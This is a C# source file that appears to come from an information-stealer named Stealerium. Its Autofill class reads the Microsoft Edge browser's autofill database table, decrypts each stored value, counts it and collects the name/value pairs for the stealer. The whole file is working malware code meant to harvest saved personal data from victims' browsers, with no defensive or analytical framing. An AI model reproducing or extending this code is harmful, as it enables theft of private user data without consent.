using System;
using System.Collections.Generic;
using Stealerium.Helpers;
using Stealerium.Target.Browsers.Chromium;

namespace Stealerium.Target.Browsers.Edge;

internal sealed class Autofill
{
	public static List<AutoFill> Get(string sWebData)
	{
		List<AutoFill> list = new List<AutoFill>();
		try
		{
			SqLite sqLite = SqlReader.ReadTable(sWebData, "autofill");
			if (sqLite == null)
			{
				return list;
			}
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				AutoFill autoFill = default(AutoFill);
				autoFill.Name = Crypto.GetUtf8(sqLite.GetValue(i, 1));
				autoFill.Value = Crypto.GetUtf8(Crypto.EasyDecrypt(sWebData, sqLite.GetValue(i, 2)));
				AutoFill item = autoFill;
				Counter.AutoFill++;
				list.Add(item);
			}
			return list;
		}
		catch (Exception ex)
		{
			Logging.Log("Edge >> Failed collect autofill\n" + ex);
			return list;
		}
	}
}
